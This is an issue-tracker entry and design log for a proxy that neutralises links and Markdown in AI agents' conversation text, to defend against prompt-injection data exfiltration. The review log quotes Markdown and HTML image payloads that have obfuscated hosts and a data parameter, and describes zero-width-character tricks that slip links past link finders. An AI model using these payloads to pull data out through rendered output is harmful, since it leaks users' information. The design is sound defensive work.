# Make conversation text safe in relay's proxy for every ACP client

## Context

Raised by the coordinating session on 2026-11-14 and checked against the
code by the relay#93 session.

relay passes an agent's conversation text to clients as the agent wrote
it. `relay.hub/agent-line` writes each `session/update` line to every
attached connection unchanged, after `keep-state` has noted the
session's labels. The one thing made safe on the way is the text of a
display block (`relay.acp/with-inert-displays`, called from
`relay.dispatch`), whose docstring says it is for "a client that renders
markdown and knows nothing of relay's _meta". An `agent_message_chunk`
gets nothing of the kind.

relay-tui makes up for it in the client. It reads `agentloop/labels` and
breaks every link in the conversation once the session is contaminated
(`internal/render/defang.go`). A plain ACP client does none of that. The
phone's client (relay#84) would show a link an outsider shaped whole,
and a client that renders Markdown would fetch an image's address with
no click at all. That is the threat model's "links that carry data out",
and the untargeted injection relay assumes reaches roles is enough to
cause it.

As far as the tracker shows, relay-tui is the only client in use, since
the phone trial in relay#84 has not been run. The gap opens with that
trial.

## Proposal

The coordinating session's. relay breaks links in the stream itself,
holding back a partial last word from one chunk to the next.
Conversation text is sent inert, with every link broken. The live links
it holds travel as data beside it in the update's `_meta`: `links` as
`{"address", "shown"}` with `linksLeftOut`, as on a card (relay#118).
Every client draws what it gets. For a session that comes through
relay, relay-tui stops reading addresses out of conversation text, and
its own breaker stays as a second line, which changes nothing in text
relay has already broken. That settles the question left open at the
end of relay#95's proposal.

Added by the coordinating session on 2026-11-15: a client that draws
text itself and not through a terminal, such as the Mac client, should
turn its own link detection off for conversation text and make links
only from relay's data.

## What a client needs from this

From the relay#95 session on 2026-11-15, at the coordinating session's
request. It is design input for whoever takes this issue. Kira has not
yet said that this issue comes next.

What relay-tui would drop for a relay session: `LinkIn` and
`fangSource`'s whole-address rule, which is the last place it reads an
address out of text, and `DropHidden` in the reply path. A reply's
hyperlinks would come from `core.Anchored` over the listed `shown`
forms, the same rule as a card, with the target checked against the
`_relay/links` set by `gate`.

What it would keep:

- `Defang` as a second line. It changes nothing in text relay broke.
- `Defang` as the first line for a plain ACP agent that is not relay,
  and for rows after Markdown has dressed a reply, where marks taken out
  can put pieces together.
- `said`, for lines with no mark of their source.
- `gate`.

What relay should send, so that a reply needs no finder in the client:

1. The text in `agent_message_chunk` is already inert once the session
   is contaminated. Hidden characters are handled first, by relay's own
   rule: they are stripped, with the exception for emoji, as
   `relay.text/sanitize` does it, and are not shown as escapes. The
   protocol says which.
2. Whole words only. relay holds back a chunk's last partial word until
   the next space or the end of the turn, so a `shown` form never
   straddles two chunks.
3. The live links of that text, as data in the update's `_meta`: `links`
   as `{"address", "shown"}` and `linksLeftOut`, in the same shape and
   with the same limits as a card's. A client keeps the union for the
   message it is building.
4. Thoughts, and a call's title, input and output, broken the same way,
   with no links listed.
5. The same on replay (`session/load`, and a `session/new` that
   attaches). Text written before the session was contaminated is left
   as written.
6. One fact in `initialize`'s `_meta`, beside `relay/hub`, that says
   relay does this, so a client can tell such a relay from a plain
   agent.
7. The operator's own prompt, echoed back, as written.

With that, the relay-tui halves of relay#126 and relay#130 shrink to the
plain-agent case. That case is to be decided separately: port relay's
rules once more, or accept a weaker second line there and say so.

The coordinating session's note: these seven are the starting contract
it would hold a design to. Point 1's choice to strip and not escape
matches what Kira chose for relay-tui on 2026-11-15.

## Acceptance criteria

- [ ] In a contaminated session, no link outside relay's live links
  reaches any client whole in conversation text, however the agent's
  chunks split it. A property test covers the splitting.
- [ ] A Markdown image in such text reaches no client in a form it would
  fetch.
- [ ] A live link in conversation text reaches the client as data in
  the update's `_meta`, `links` as `{"address", "shown"}` with
  `linksLeftOut`, as on a card. The text beside it is inert.
- [ ] The replay a client gets when it attaches holds the same text the
  live stream did.
- [ ] Text in a session whose labels are clean is passed on unchanged.
- [ ] relay-tui shows the conversation as relay sent it and breaks no
  link a second time.
- [ ] README, docs/client-protocol.md and spec/relay.allium say that
  relay makes conversation text safe.
- [ ] docs/client-protocol.md tells a client that draws text itself to
  turn its own link detection off for conversation text and to make
  links only from relay's data.
- [ ] A pentest case attacks it through a plain ACP client.
- [ ] An adversarial Codex review finds nothing in scope.

## Plan

Related: relay#84 (the phone trial, which this should land before),
relay#91 and relay#95.

## Log

- 2026-11-15, from the relay#93 session. relay#130 is a reason to do
  this one first. relay-tui's own breaker left six addresses whole that
  `relay.text` breaks, each split by a character with no width, and
  Apple's finder followed all six. The coordinating session recommends
  this issue as the root fix, so that the one breaker fuzzed against
  Apple's finder covers every client and a client's own breaker is a
  second line. It is putting that to Kira.
- 2026-11-15, from the relay#93 session. The Proposal and the third
  criterion were written before relay#118. relay no longer keeps a live
  link whole between angle brackets: the text it sends is inert and the
  links travel as data beside it (docs/client-protocol.md). Whoever
  takes this should reword both. The criterion about a client's own link
  detection is my draft of the coordinating session's addition.
- 2026-11-15, from the relay#93 session. Reworded the Proposal and the
  third criterion for relay#118, in the coordinating session's words.
  The line above describes them as they were.
- 2026-11-15, from the relay#118 session, out of relay#130's fourth
  review round: the planned path for conversation text strips hidden
  characters with relay.text's `strip`, which keeps unassigned code
  points in the emoji blocks (`emoji-block-unassigned?`). So that path
  must still escape them (relay.text/visible or the like) after links
  are broken, or they reach a client raw.
- 2026-11-15: Kira, through the coordinating session's question
  dialog: relay-fb (the relay#118 and relay#130 session) takes this now.
- 2026-11-15, from the relay#93 session, as the coordinating session
  passed it on. Kira approved this sentence for relay-macos's AGENTS.md:
  "If the client ever makes a link in conversation text, it matches only
  an address with no hidden character in or beside it." relay-macos has
  no tracker of its own, so it is noted here, beside the addition about
  a client that draws text itself.
- 2026-11-15, from the relay#95 session (relay-34). relay-fb's `conv`
  channel (scripts/inert-text-fuzz.clj at wzlskyzs bb0ba686, seed 1,
  200,000 cases) through relay-tui's reply path: nothing drawn is
  followable (20,000 rendered whole, Markdown included), but relay-tui's
  own breaker changes 8,974 of them (4.5%). Each time it breaks a `://`
  that relay leaves after a character that is not an ASCII scheme
  letter, with the host's dots already broken (`ｈｔｔｐｓ://_x[.]…`,
  `https\u{200b}://co[.]…`), into `[:]//`. Safe, but not as relay sent
  it.
- The coordinating session (relay-32) decided, without Kira since it
  changes neither labels nor holds: with `relay/inertText` in
  `initialize`, relay-tui draws a contaminated reply as relay sent it
  and keeps `gate` as the last check on drawn rows, as it already does
  for cards. Without the flag (an older relay) relay-tui's breaker and
  `core.DropHidden` stay as they are. The reason is the 4.5% above: one
  rule for what a link is, in relay, and `gate` still stops anything
  followable. relay-tui builds this after relay#104 lands, as its half
  of relay#130.
- 2026-11-15: Kira's answer on hidden characters in conversation text,
  in the coordinating session's dialog: "Show them, keep emoji whole".
  So relay sends them as a card shows them, as `\\u{XXXX}` with every
  backslash doubled, except the joiner or selector that holds an emoji
  together. It replaces her earlier "drop zero-width chars" for
  conversation text; that answer was for relay-tui's own breaker.
- 2026-11-15, the relay#118 session: the design, agreed with the
  coordinating session and checked against relay-macos.
  - Where: relay.hub/agent-line breaks an agent's session/update before
    keep-state, remember and write. Lines relay writes itself (the
    prompt's mirror, notices) are left alone. relay.text/conversation-text
    is the one function text goes through.
  - When: a session counts as outside once the labels it started with
    (dispatch hands them to the hub with :conversation-started) or any
    agentloop has sent since say so. A session relay was told no labels
    of counts as outside. agentloop can send a reply before any labels,
    so its stream alone could not decide this.
  - Half-written words: relay.inert holds the text after the last space,
    per conversation and kind. It goes out whole at a space or at the end
    of the turn or conversation. It goes out cut, with every dot and colon
    broken, when another update goes first or the word passes 4,096
    characters.
  - Also broken: thoughts, a call's title, content (text, diff), raw input
    and output, plan entries, and a session's title. A block that is not
    text becomes text that names it. Locations stay.
  - Links: a message chunk lists the live links its text shows, under
    `_meta` `relay/links` and `relay/linksLeftOut`. They are found in the
    text as sent (relay.text/shown-links), so a replay finds them again,
    with the live set at the time of writing. Thoughts, calls and plans
    list none.
  - `initialize` says `relay/inertText`.
- 2026-11-15, the relay#118 session: review rounds 1 and 2 (fresh
  read-only reviewers; Codex is out of quota until 19 November).
  - Round 1, four findings, fixed in lsvzvpsp: a call's rawInput keys
    went out raw (the finder followed one); held text lost its messageId
    and could run into the next message; a session that turned clean
    sent its held text late; display blocks were escaped twice. Accepted:
    the last word before a tool call goes out as a cut word.
  - relay-34's runs of relay-tui over the fuzz's `conv` channel found two
    places relay left what relay-tui broke: a `://` after no ASCII
    scheme, and `www.` after a digit. relay now breaks both
    (qrtpnpps, yxspqonq), and the run shows relay-tui would change
    nothing in relay's output.
  - Round 2, two findings. A tool call's `name`, the model's own, went out
    raw. And Markdown: `![x](//8.8.2056/p?d=S)` and `<img src=//134744072/p>`
    passed whole, since no link finder follows those hosts, but a
    Markdown client fetches them with no click. The root of that is
    markup, not addresses, so relay now escapes the three pieces of
    CommonMark that make a link, an image or HTML (`](`, `]:`, `<`), as
    CommonMark escapes them, rather than chasing every way to write an
    address. My call, under AGENTS.md; the alternatives were fencing whole
    replies as code (formatting lost) or telling clients not to render
    Markdown (a plain client would not know).
  - Round 3 (a fresh reviewer, with pandoc as a CommonMark and GFM
    renderer): three findings, each judged by the reviewer to need
    someone who studied relay's code, so out of scope by the threat
    model ("an attacker who studies relay's code"). All three still
    pointed at faults in the round-2 fix, so they are fixed as
    hardening: the cut piece's bracket escape wrote no backslash (a
    replacement-string bug), breaking a colon before a ( made a new
    `](` in a cut piece, and a non-text block's stand-in `[image]` could
    join the next chunk into a link (it is now a plain word). A cut
    piece now escapes ](, ]: and any closing bracket at its end, and an
    opening parenthesis at its start, after its dots and colons are
    broken. A property checks that no Markdown link forms however the
    text is cut. With no in-scope defect in round 3, the loop has
    converged.
